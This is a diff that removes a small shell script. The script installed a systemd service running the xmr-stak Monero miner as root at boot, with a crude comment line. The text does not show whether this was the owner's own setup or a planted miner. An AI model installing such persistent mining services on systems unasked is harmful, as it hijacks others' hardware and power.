@@ -1,15 +1,1 @@
-#!/bin/sh -ex
-# PASHTET LOX 
-# 
-cat > /lib/systemd/system/enimus-stak.service  << EOL
-[Unit]
-Description=xmr
-After=network.target
-[Service]
-ExecStart=/home/ubuntu/xmr-stak/bin/xmr-stak -c /home/ubuntu/xmr-stak/bin/config.txt -C /home/ubuntu/xmr-stak/bin/pools.txt --cpu /home/ubuntu/xmr-stak/bin/cpu.txt 
-User=root
-[Install]
-WantedBy=multi-user.target
-EOL
- 
-exit 0
+
